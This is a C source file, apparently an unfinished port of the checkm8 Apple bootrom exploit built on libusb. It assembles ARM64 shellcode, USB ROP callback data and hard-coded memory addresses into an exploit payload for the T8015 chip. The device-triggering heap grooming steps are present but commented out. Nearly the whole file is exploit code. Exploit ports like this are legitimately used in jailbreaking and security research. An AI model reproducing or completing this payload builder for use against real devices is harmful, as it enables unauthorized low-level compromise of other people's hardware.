/*
* Queen - Checkm8, but in C
*   Built on libusb
* 
* Based on checkm8.py in ipwndfu by axiomX
*/

#include <assert.h>
#include <stdalign.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>

#include "config.h"
#include "dfu.h"
#include "util.h"

typedef struct overwrite {
    
} overwrite;

int exploit() {
    printf("[x] *** checkm8 exploit by axi0mX ***\n");

    int status = 0;

    printf("[x]\tPreparing shellcode...\n");
    
    payload_config payload_cfg = get_config(8015);
    v8 shellcode = prepare_shellcode("checkm8_arm64", &payload_cfg.constants_checkm8);
    v8 final_shellcode = v8_new(shellcode.size);
    v8 callback_data = usb_rop_callbacks(0x18001C020, payload_cfg.func_gadget, payload_cfg.callbacks);
    v8 handler = v8_new(3);
    v8_append(&handler, asm_arm64_x7_trampoline(payload_cfg.handle_interface_request));
    v8_push(&handler, asm_arm64_branch(0x10, 0x0));
    v8 usb_shellcode = prepare_shellcode("usb_0xA1_2_arm64", &payload_cfg.constants_usb);
    v8_append(&handler, v8_range_of(&usb_shellcode, 4, 4));

    assert(shellcode.size <= PAYLOAD_OFFSET_ARM64);
    assert(handler.size <= PAYLOAD_SIZE_ARM64);

    // v8_append(&final_shellcode, shellcode);

    if (shellcode.size < PAYLOAD_OFFSET_ARM64) {
        v8_append(&shellcode, v8_zeros(PAYLOAD_OFFSET_ARM64 - shellcode.size));
    }
    
    v8_append(&shellcode, handler);

    /*
        struct.pack('<6Q16x448s1536x1024s', 
            0x180020400-8, 0x1000006A5, 
            0x180020600-8, 0x180000625, 
            0x18000C600-8, 0x180000625, 
            t8015_callback_data, t8015_shellcode)

        0x30 uint64_t + 0x10 pad bytes + 0x1C0 callback data + 0x600 pad bytes + 0x400 shellcode 
    */

    v64 addrs = v64_new(6);
    v64_push(&addrs, 0x180020400-8);
    v64_push(&addrs, 0x1000006A5);
    v64_push(&addrs, 0x180020600-8);
    v64_push(&addrs, 0x180000625);
    v64_push(&addrs, 0x18000C600-8);
    v64_push(&addrs, 0x180000625);
    // free(addrs);

    v8_append(&final_shellcode, v64_convert_v8(addrs));
    printf("size: 0x%03lx\n", final_shellcode.size);
    v8_append(&final_shellcode, v8_zeros(0x10));
    printf("size: 0x%03lx\n", final_shellcode.size);
    v8_append(&final_shellcode, callback_data);
    printf("size: 0x%03lx\n", final_shellcode.size);
    v8_append(&final_shellcode, v8_zeros(0x600));
    printf("size: 0x%03lx\n", final_shellcode.size);
    v8_append(&final_shellcode, shellcode);

    printf("size: 0x%03lx\n", final_shellcode.size);

    


    // aquire_device();

    // printf("[x]\tHeap feng-shui...\n");    

    // stall(handle);
    // for (int i = 0; i < 6; i++) {
    //     no_leak(handle);
    // }
    // usb_req_leak(handle);
    // no_leak(handle);

    // libusb_reset_device(handle);
    // release_device();

    // printf("[x]\tCompleted, reopening device without clearing global vars...\n");
    // aquire_device();

    return status;
}

int main(int argc, char const *argv[])
{
    int status = 0;
    init_ctx();
    
    // Run the exploit
    status = exploit();

    return status;
}
